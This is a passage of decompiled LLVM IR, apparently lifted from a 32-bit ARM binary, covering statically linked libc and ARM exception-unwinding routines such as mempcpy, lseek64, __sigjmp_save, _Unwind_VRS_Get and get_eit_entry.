  store i32 %v1_21744, i32* %r3.global-to-local, align 4
  %v1_21748 = trunc i32 %v1_21744 to i16
  store i16 %v1_21748, i16* %v1_2173c, align 2
  %v1_21790.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21788

dec_label_pc_21750:                               ; preds = %dec_label_pc_2171c
  %v1_21750 = and i32 %v3_2171c, 64
  %v2_21750 = icmp eq i32 %v1_21750, 0
  br i1 %v2_21750, label %dec_label_pc_21778, label %dec_label_pc_21758

dec_label_pc_21758:                               ; preds = %dec_label_pc_21750
  %v0_21758 = load i32, i32* @r0, align 4
  %v1_21758 = call i32 @__stdio_wcommit(i32 %v0_21758)
  store i32 %v1_21758, i32* %r0.global-to-local, align 4
  %v2_2175c = icmp eq i32 %v1_21758, 0
  br i1 %v2_2175c, label %dec_label_pc_21764, label %dec_label_pc_2173c

dec_label_pc_21764:                               ; preds = %dec_label_pc_21758
  %v0_21764 = load i32, i32* @r4, align 4
  %v1_21764 = inttoptr i32 %v0_21764 to i16*
  %v2_21764 = load i16, i16* %v1_21764, align 2
  %v3_21764 = zext i16 %v2_21764 to i32
  store i32 %v3_21764, i32* %r3.global-to-local, align 4
  %v1_21768 = add i32 %v0_21764, 8
  %v2_21768 = inttoptr i32 %v1_21768 to i32*
  %v3_21768 = load i32, i32* %v2_21768, align 4
  %v1_2176c = and i32 %v3_21764, 65471
  store i32 %v1_2176c, i32* %r3.global-to-local, align 4
  %v2_21770 = add i32 %v0_21764, 28
  %v3_21770 = inttoptr i32 %v2_21770 to i32*
  store i32 %v3_21768, i32* %v3_21770, align 4
  %v0_21774 = load i32, i32* %r3.global-to-local, align 4
  %v1_21774 = trunc i32 %v0_21774 to i16
  %v2_21774 = load i32, i32* @r4, align 4
  %v3_21774 = inttoptr i32 %v2_21774 to i16*
  store i16 %v1_21774, i16* %v3_21774, align 2
  %v0_21778.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_21778

dec_label_pc_21778:                               ; preds = %dec_label_pc_21750, %dec_label_pc_21764
  %v2_21780 = phi i32 [ %v0_2171c, %dec_label_pc_21750 ], [ %v0_21778.pre, %dec_label_pc_21764 ]
  %v1_21778 = inttoptr i32 %v2_21780 to i16*
  %v2_21778 = load i16, i16* %v1_21778, align 2
  %v3_21778 = zext i16 %v2_21778 to i32
  %v1_2177c = or i32 %v3_21778, 1
  store i32 %v1_2177c, i32* %r3.global-to-local, align 4
  %v1_21780 = trunc i32 %v1_2177c to i16
  store i16 %v1_21780, i16* %v1_21778, align 2
  %v0_21784 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_21784, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21788

dec_label_pc_21788:                               ; preds = %dec_label_pc_2173c, %dec_label_pc_21778
  %v1_21790 = phi i32 [ %v1_21790.pre, %dec_label_pc_2173c ], [ %v0_21784, %dec_label_pc_21778 ]
  %v2_2178c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2178c, i32* @r4, align 4
  ret i32 %v1_21790

; uselistorder directives
  uselistorder i32 %v3_216f8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_21788, { 1, 0 }
  uselistorder label %dec_label_pc_21778, { 1, 0 }
  uselistorder label %dec_label_pc_21728, { 1, 0 }
  uselistorder label %dec_label_pc_2171c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_21798 = load i32, i32* @r4, align 4
  %v6_21798 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_217a8 = call i32 @memcpy()
  %v0_217ac = load i32, i32* @r5, align 4
  %v1_217ac = load i32, i32* @r4, align 4
  %v2_217ac = add i32 %v1_217ac, %v0_217ac
  store i32 %v3_21798, i32* @r4, align 4
  store i32 %v6_21798, i32* @r5, align 4
  ret i32 %v2_217ac
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_217bc = load i32, i32* @r1, align 4
  %v2_217bc = icmp eq i32 %v0_217bc, 0
  %v3_217c0 = load i32, i32* @r4, align 4
  store i32 %v3_217c0, i32* %stack_var_-8, align 4
  %v0_217c4 = load i32, i32* @r0, align 4
  store i32 %v0_217c4, i32* %r4.global-to-local, align 4
  br i1 %v2_217bc, label %dec_label_pc_217e8, label %dec_label_pc_217cc

dec_label_pc_217cc:                               ; preds = %entry
  %v1_217d4 = add i32 %v0_217c4, 260
  %v4_217d8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_217d4)
  %v2_217dc = icmp eq i32 %v4_217d8, 0
  br i1 %v2_217dc, label %dec_label_pc_217ec, label %dec_label_pc_217e8

dec_label_pc_217e8:                               ; preds = %dec_label_pc_217cc, %entry
  br label %dec_label_pc_217ec

dec_label_pc_217ec:                               ; preds = %dec_label_pc_217cc, %dec_label_pc_217e8
  %storemerge = phi i32 [ 0, %dec_label_pc_217e8 ], [ 1, %dec_label_pc_217cc ]
  %v1_217f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_217f0 = add i32 %v1_217f0, 256
  %v3_217f0 = inttoptr i32 %v2_217f0 to i32*
  store i32 %storemerge, i32* %v3_217f0, align 4
  %v2_217f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_217f4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 6, 0, 3, 4, 1, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 45, 39, 40, 41, 42, 43, 44, 46, 38, 37, 36, 35, 34, 57, 58, 60, 61, 62, 63, 64, 65, 59, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 52, 53, 54, 55, 56, 77, 51, 50, 49, 48, 47 }
  uselistorder label %dec_label_pc_217ec, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_21844, label %dec_label_pc_21828

dec_label_pc_21828:                               ; preds = %entry
  %v0_2182c = call i32 @__aeabi_read_tp()
  %v3_21830 = load i16, i16* @global_var_2c068.414, align 2
  %v4_21830 = sext i16 %v3_21830 to i32
  %v0_21834 = load i32, i32* %r2.global-to-local, align 4
  %v1_21834 = sub i32 0, %v0_21834
  store i32 %v1_21834, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2183c = add i32 %v4_21830, %v0_2182c
  %v4_2183c = inttoptr i32 %v3_2183c to i32*
  store i32 %v1_21834, i32* %v4_2183c, align 4
  %v0_2184c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2184c

dec_label_pc_21844:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_21844 = icmp eq i32 %arg1, 0
  br i1 %v2_21844, label %dec_label_pc_21858, label %dec_label_pc_2184c

dec_label_pc_2184c:                               ; preds = %dec_label_pc_21844, %dec_label_pc_21828
  %v0_2184c = phi i32 [ %arg1, %dec_label_pc_21844 ], [ %v0_2184c.pre, %dec_label_pc_21828 ]
  %v3_21850 = ashr i32 %v0_2184c, 31
  br label %dec_label_pc_2185c

dec_label_pc_21858:                               ; preds = %dec_label_pc_21844
  br label %dec_label_pc_2185c

dec_label_pc_2185c:                               ; preds = %dec_label_pc_2184c, %dec_label_pc_21858
  %v1_21864 = phi i32 [ %v0_2184c, %dec_label_pc_2184c ], [ %tmp8, %dec_label_pc_21858 ]
  %storemerge = phi i32 [ %v3_21850, %dec_label_pc_2184c ], [ %tmp, %dec_label_pc_21858 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_21864

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 10, 8, 9, 11, 2, 3, 4, 5, 6, 0, 1, 7 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_2c068.414, { 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 73, 50, 49, 72, 71, 81, 80, 76, 77, 75, 74, 79, 78, 55, 54, 53, 52, 51, 17, 16, 42, 15, 70, 40, 39, 12, 6, 5, 11, 14, 13, 10, 3, 2, 30, 9, 8, 7, 48, 47, 29, 38, 37, 41, 25, 28, 27, 67, 66, 24, 23, 46, 22, 45, 21, 36, 20, 44, 19, 56, 65, 18, 69, 68, 35, 32, 31, 59, 58, 4, 64, 26, 57, 63, 43, 62, 61, 60, 0, 1, 34, 33 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_2185c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_2186c = icmp eq i32 %regclass, 0
  br i1 %v2_2186c, label %dec_label_pc_21874, label %dec_label_pc_218a4

dec_label_pc_21874:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_21874
  %v6_21878 = icmp eq i32 %representation, 0
  br i1 %v6_21878, label %dec_label_pc_21888, label %bb8

.thread3:                                         ; preds = %dec_label_pc_21874
  br label %dec_label_pc_218b0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_218b0

dec_label_pc_21888:                               ; preds = %bb
  %v3_21888 = mul i32 %regno, 4
  %v2_2188c = add i32 %v3_21888, %context
  %v1_21890 = add i32 %v2_2188c, 4
  %v2_21890 = inttoptr i32 %v1_21890 to i32*
  %v3_21890 = load i32, i32* %v2_21890, align 4
  %v2_2189c = bitcast i8* %valuep to i32*
  store i32 %v3_21890, i32* %v2_2189c, align 4
  ret i32 0

dec_label_pc_218a4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_218a4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_218a4, %bb9
  %v0_218ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_218ac)
  br label %dec_label_pc_218b0

dec_label_pc_218b0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_218b0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_218b8 = icmp eq i32 %regclass, 0
  br i1 %v2_218b8, label %dec_label_pc_218c0, label %dec_label_pc_218f0

dec_label_pc_218c0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_218c0
  %v6_218c4 = icmp eq i32 %representation, 0
  br i1 %v6_218c4, label %dec_label_pc_218d4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_218c0
  br label %dec_label_pc_218fc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_218fc

dec_label_pc_218d4:                               ; preds = %bb
  %v3_218d8 = mul i32 %regno, 4
  %v1_218dc = bitcast i8* %valuep to i32*
  %v2_218dc = load i32, i32* %v1_218dc, align 4
  %v2_218e0 = add i32 %v3_218d8, %context
  %v2_218e8 = add i32 %v2_218e0, 4
  %v3_218e8 = inttoptr i32 %v2_218e8 to i32*
  store i32 %v2_218dc, i32* %v3_218e8, align 4
  ret i32 0

dec_label_pc_218f0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_218f0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_218f0, %bb9
  %v0_218f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_218f8)
  br label %dec_label_pc_218fc

dec_label_pc_218fc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_218fc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_21904 = add i32 %context, 68
  %v2_21904 = inttoptr i32 %v1_21904 to i32*
  %v3_21904 = load i32, i32* %v2_21904, align 4
  ret i32 %v3_21904

; uselistorder directives
  uselistorder i32 68, { 11, 0, 9, 1, 10, 2, 4, 5, 6, 7, 3, 8 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_21914 = add i32 %exc, 8
  %v2_21914 = inttoptr i32 %v1_21914 to i32*
  %v3_21914 = load i32, i32* %v2_21914, align 4
  %v2_21918 = icmp eq i32 %v3_21914, 0
  br i1 %v2_21918, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_2192c = xor i1 %v2_21918, true
  call void @__pseudo_cond_branch(i1 %v2_2192c, i32 %v3_21914)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_21944 = call i32 @abort()
  ret i32 %v0_21944
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_21950 = call i32 @abort()
  ret i32 %v0_21950
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_21954 = load i32, i32* @r4, align 4
  store i32 %v3_21954, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r5.global-to-local, align 4
  %v4_21964 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 132) to i32*), align 4
  %v2_21968 = icmp eq i32 %v4_21964, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_21974 = add i32 %return_address, -2
  store i32 %v1_21974, i32* %r4.global-to-local, align 4
  br i1 %v2_21968, label %dec_label_pc_219ac, label %dec_label_pc_2197c

dec_label_pc_2197c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_21964)
  %v2_2198c = icmp eq i32 %v1_21974, 0
  br i1 %v2_2198c, label %.thread, label %dec_label_pc_219ccthread-pre-split

.thread:                                          ; preds = %dec_label_pc_2197c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_21994 = load i32, i32* %r6.global-to-local, align 4
  %v3_21994 = add i32 %v2_21994, 16
  %v4_21994 = inttoptr i32 %v3_21994 to i32*
  store i32 0, i32* %v4_21994, align 4
  br label %dec_label_pc_2199c

dec_label_pc_2199c:                               ; preds = %.thread, %.thread10, %dec_label_pc_21b44, %dec_label_pc_21b30, %dec_label_pc_21b0c, %dec_label_pc_21ae4, %dec_label_pc_219e4
  %v0_2199c = load i32, i32* %r2.global-to-local, align 4
  %v2_219a4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_219a4, i32* @r4, align 4
  ret i32 %v0_2199c

dec_label_pc_219ac:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_219b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 20) to i32*), align 4
  %v4_219b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 48) to i32*), align 4
  store i32 %v4_219b8, i32* %r2.global-to-local, align 4
  %v2_219bc = sub i32 %v4_219b4, %v4_219b8
  %v3_219c0 = sdiv i32 %v2_219bc, 8
  store i32 %v3_219c0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_219cc

dec_label_pc_219ccthread-pre-split:               ; preds = %dec_label_pc_2197c
  %v3_219cc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_219cc

dec_label_pc_219cc:                               ; preds = %dec_label_pc_219ccthread-pre-split, %dec_label_pc_219ac
  %v0_21a10.pre = phi i32 [ %v1_21974, %dec_label_pc_219ccthread-pre-split ], [ %v4_219b8, %dec_label_pc_219ac ]
  %v1_219d4 = phi i32 [ %v3_219cc.pr, %dec_label_pc_219ccthread-pre-split ], [ %v3_219c0, %dec_label_pc_219ac ]
  %v2_219d0 = icmp eq i32 %v1_219d4, 0
  br i1 %v2_219d0, label %dec_label_pc_219e4, label %dec_label_pc_21a00.preheader

dec_label_pc_21a00.preheader:                     ; preds = %dec_label_pc_219cc
  %v2_219d4 = add i32 %v1_219d4, -1
  %v1_21a30 = add i32 %v0_21a10.pre, 8
  br label %dec_label_pc_21a00.outer

dec_label_pc_219e4.loopexit:                      ; preds = %dec_label_pc_21a5c
  br label %dec_label_pc_219e4

dec_label_pc_219e4:                               ; preds = %dec_label_pc_219e4.loopexit, %dec_label_pc_219cc, %dec_label_pc_21b28
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_219ec = load i32, i32* %r6.global-to-local, align 4
  %v2_219ec = add i32 %v1_219ec, 16
  %v3_219ec = inttoptr i32 %v2_219ec to i32*
  store i32 0, i32* %v3_219ec, align 4
  br label %dec_label_pc_2199c

dec_label_pc_219f4:                               ; preds = %dec_label_pc_21a50
  %v3_219f4 = icmp ult i32 %storemerge40, %v0_21a54
  br i1 %v3_219f4, label %dec_label_pc_219fc, label %dec_label_pc_21a6c

dec_label_pc_219fc:                               ; preds = %dec_label_pc_219f4
  %v1_219fc = add nsw i32 %v3_21a08, 1
  br label %dec_label_pc_21a00.outer

dec_label_pc_21a00.outer:                         ; preds = %dec_label_pc_219fc, %dec_label_pc_21a00.preheader
  %v1_21a5c.ph = phi i32 [ %v1_219fc, %dec_label_pc_219fc ], [ 0, %dec_label_pc_21a00.preheader ]
  %v0_21a00.ph = phi i32 [ %v0_21a00, %dec_label_pc_219fc ], [ %v2_219d4, %dec_label_pc_21a00.preheader ]
  br label %dec_label_pc_21a00

dec_label_pc_21a00:                               ; preds = %dec_label_pc_21a00.outer, %dec_label_pc_21a64
  %v0_21a00 = phi i32 [ %v1_21a64, %dec_label_pc_21a64 ], [ %v0_21a00.ph, %dec_label_pc_21a00.outer ]
  %v2_21a00 = add i32 %v0_21a00, %v1_21a5c.ph
  %tmp = icmp slt i32 %v2_21a00, 0
  %v4_21a04 = zext i1 %tmp to i32
  %v5_21a04 = add i32 %v4_21a04, %v2_21a00
  %v3_21a08 = sdiv i32 %v5_21a04, 2
  %v3_21a0c = mul i32 %v3_21a08, 8
  store i32 %v3_21a0c, i32* @ip, align 4
  %v2_21a10 = add i32 %v3_21a0c, %v0_21a10.pre
  %v3_21a10 = inttoptr i32 %v2_21a10 to i32*
  %v4_21a10 = load i32, i32* %v3_21a10, align 4
  %v1_21a14 = and i32 %v4_21a10, 1073741824
  %v2_21a14 = icmp eq i32 %v1_21a14, 0
  %v2_21a18 = or i32 %v4_21a10, -2147483648
  %tmp79 = bitcast i32 %v4_21a10 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_21a1c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_21a14, i32 %v2_21a1c, i32 %v2_21a18
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_21a20 = icmp eq i32 %v2_219d4, %v3_21a08
  store i32 %v2_21a10, i32* %r7.global-to-local, align 4
  br i1 %v9_21a20, label %dec_label_pc_21a50, label %dec_label_pc_21a30

dec_label_pc_21a30:                               ; preds = %dec_label_pc_21a00
  %v2_21a34 = add i32 %v3_21a0c, %v1_21a30
  %v3_21a34 = inttoptr i32 %v2_21a34 to i32*
  %v4_21a34 = load i32, i32* %v3_21a34, align 4
  %v1_21a3c = and i32 %v4_21a34, 1073741824
  %v2_21a3c = icmp eq i32 %v1_21a3c, 0
  %v2_21a40 = or i32 %v4_21a34, -2147483648
  %tmp81 = bitcast i32 %v4_21a34 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_21a44 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_21a3c, i32 %v2_21a44, i32 %v2_21a40
  %v1_21a48 = add i32 %v2_21a34, -1
  %v2_21a4c = add i32 %storemerge39, %v1_21a48
  br label %dec_label_pc_21a50

dec_label_pc_21a50:                               ; preds = %dec_label_pc_21a00, %dec_label_pc_21a30
  %storemerge40 = phi i32 [ %v2_21a4c, %dec_label_pc_21a30 ], [ -1, %dec_label_pc_21a00 ]
  %v2_21a50 = add i32 %storemerge, %v2_21a10
  %v0_21a54 = load i32, i32* %r4.global-to-local, align 4
  %v3_21a54 = icmp ult i32 %v0_21a54, %v2_21a50
  br i1 %v3_21a54, label %dec_label_pc_21a5c, label %dec_label_pc_219f4

dec_label_pc_21a5c:                               ; preds = %dec_label_pc_21a50
  %v9_21a5c = icmp eq i32 %v3_21a08, %v1_21a5c.ph
  br i1 %v9_21a5c, label %dec_label_pc_219e4.loopexit, label %dec_label_pc_21a64

dec_label_pc_21a64:                               ; preds = %dec_label_pc_21a5c
  %v1_21a64 = add nsw i32 %v3_21a08, -1
  br label %dec_label_pc_21a00

dec_label_pc_21a6c:                               ; preds = %dec_label_pc_219f4
  %v2_21a6c = load i32, i32* %v3_21a10, align 4
  %v1_21a70 = and i32 %v2_21a6c, 1073741824
  %v2_21a70 = icmp eq i32 %v1_21a70, 0
  %v2_21a74 = or i32 %v2_21a6c, -2147483648
  %tmp83 = bitcast i32 %v2_21a6c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_21a78 = bitcast float %tmp84 to i32
  %v0_21a7c = select i1 %v2_21a70, i32 %v2_21a78, i32 %v2_21a74
  %v2_21a7c = add i32 %v0_21a7c, %v2_21a10
  %v1_21a80 = load i32, i32* %r6.global-to-local, align 4
  %v2_21a80 = add i32 %v1_21a80, 72
  %v3_21a80 = inttoptr i32 %v2_21a80 to i32*
  store i32 %v2_21a7c, i32* %v3_21a80, align 4
  %v0_21a84 = load i32, i32* %r7.global-to-local, align 4
  %v1_21a84 = add i32 %v0_21a84, 4
  %v2_21a84 = inttoptr i32 %v1_21a84 to i32*
  %v3_21a84 = load i32, i32* %v2_21a84, align 4
  %v7_21a88 = icmp eq i32 %v3_21a84, 1
  br i1 %v7_21a88, label %.thread10, label %dec_label_pc_21a9c

.thread10:                                        ; preds = %dec_label_pc_21a6c
  %v1_21a88 = add i32 %v3_21a84, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_21a94 = load i32, i32* %r6.global-to-local, align 4
  %v3_21a94 = add i32 %v2_21a94, 16
  %v4_21a94 = inttoptr i32 %v3_21a94 to i32*
  store i32 %v1_21a88, i32* %v4_21a94, align 4
  br label %dec_label_pc_2199c

dec_label_pc_21a9c:                               ; preds = %dec_label_pc_21a6c
  %v1_21a9c = icmp slt i32 %v3_21a84, 0
  br i1 %v1_21a9c, label %.thread38, label %dec_label_pc_21ab4

.thread38:                                        ; preds = %dec_label_pc_21a9c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_21aa8 = load i32, i32* %r6.global-to-local, align 4
  %v5_21aa8 = add i32 %v4_21aa8, 76
  %v6_21aa8 = inttoptr i32 %v5_21aa8 to i32*
  store i32 %v1_21a84, i32* %v6_21aa8, align 4
  %v3_21aac = load i32, i32* %r2.global-to-local, align 4
  %v4_21aac = load i32, i32* %r6.global-to-local, align 4
  %v5_21aac = add i32 %v4_21aac, 80
  %v6_21aac = inttoptr i32 %v5_21aac to i32*
  store i32 %v3_21aac, i32* %v6_21aac, align 4
  br label %dec_label_pc_21ad4

dec_label_pc_21ab4:                               ; preds = %dec_label_pc_21a9c
  %v1_21ab4 = and i32 %v3_21a84, 1073741824
  %v2_21ab4 = icmp eq i32 %v1_21ab4, 0
  %v2_21ab8 = or i32 %v3_21a84, -2147483648
  %tmp85 = bitcast i32 %v3_21a84 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_21abc = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_21ab4, i32 %v2_21abc, i32 %v2_21ab8
  %v1_21ac0 = add i32 %storemerge42, 4
  %v2_21ac4 = add i32 %v1_21ac0, %v0_21a84
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_21acc = load i32, i32* %r6.global-to-local, align 4
  %v2_21acc = add i32 %v1_21acc, 76
  %v3_21acc = inttoptr i32 %v2_21acc to i32*
  store i32 %v2_21ac4, i32* %v3_21acc, align 4
  %v0_21ad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_21ad0 = load i32, i32* %r6.global-to-local, align 4
  %v2_21ad0 = add i32 %v1_21ad0, 80
  %v3_21ad0 = inttoptr i32 %v2_21ad0 to i32*
  store i32 %v0_21ad0, i32* %v3_21ad0, align 4
  br label %dec_label_pc_21ad4

dec_label_pc_21ad4:                               ; preds = %.thread38, %dec_label_pc_21ab4
  %v0_21ad4 = load i32, i32* %r6.global-to-local, align 4
  %v1_21ad4 = add i32 %v0_21ad4, 76
  %v2_21ad4 = inttoptr i32 %v1_21ad4 to i32*
  %v3_21ad4 = load i32, i32* %v2_21ad4, align 4
  store i32 %v3_21ad4, i32* %r2.global-to-local, align 4
  %v1_21ad8 = inttoptr i32 %v3_21ad4 to i32*
  %v2_21ad8 = load i32, i32* %v1_21ad8, align 4
  %v1_21adc = icmp slt i32 %v2_21ad8, 0
  br i1 %v1_21adc, label %dec_label_pc_21b00, label %dec_label_pc_21ae4

dec_label_pc_21ae4:                               ; preds = %dec_label_pc_21ad4
  %v1_21ae4 = and i32 %v2_21ad8, 1073741824
  %v2_21ae4 = icmp eq i32 %v1_21ae4, 0
  %v2_21ae8 = or i32 %v2_21ad8, -2147483648
  %tmp87 = bitcast i32 %v2_21ad8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_21aec = bitcast float %tmp88 to i32
  %v0_21af0 = select i1 %v2_21ae4, i32 %v2_21aec, i32 %v2_21ae8
  %v2_21af0 = add i32 %v0_21af0, %v3_21ad4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_21af8 = add i32 %v0_21ad4, 16
  %v3_21af8 = inttoptr i32 %v2_21af8 to i32*
  store i32 %v2_21af0, i32* %v3_21af8, align 4
  br label %dec_label_pc_2199c

dec_label_pc_21b00:                               ; preds = %dec_label_pc_21ad4
  %v3_21b00 = udiv i32 %v2_21ad8, 16777216
  %v1_21b04 = urem i32 %v3_21b00, 16
  %v2_21b04 = icmp eq i32 %v1_21b04, 0
  br i1 %v2_21b04, label %dec_label_pc_21b0c, label %dec_label_pc_21b20

dec_label_pc_21b0c:                               ; preds = %dec_label_pc_21b00
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21b14 = load i32, i32* %r5.global-to-local, align 4
  %v2_21b14 = add i32 %v0_21b14, -39664
  %v2_21b18 = add i32 %v0_21ad4, 16
  %v3_21b18 = inttoptr i32 %v2_21b18 to i32*
  store i32 %v2_21b14, i32* %v3_21b18, align 4
  br label %dec_label_pc_2199c

dec_label_pc_21b20:                               ; preds = %dec_label_pc_21b00
  %v7_21b20 = icmp eq i32 %v1_21b04, 1
  br i1 %v7_21b20, label %dec_label_pc_21b44, label %dec_label_pc_21b28

dec_label_pc_21b28:                               ; preds = %dec_label_pc_21b20
  %v7_21b28 = icmp eq i32 %v1_21b04, 2
  br i1 %v7_21b28, label %dec_label_pc_21b30, label %dec_label_pc_219e4

dec_label_pc_21b30:                               ; preds = %dec_label_pc_21b28
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21b38 = load i32, i32* %r5.global-to-local, align 4
  %v2_21b38 = add i32 %v0_21b38, -39680
  %v2_21b3c = add i32 %v0_21ad4, 16
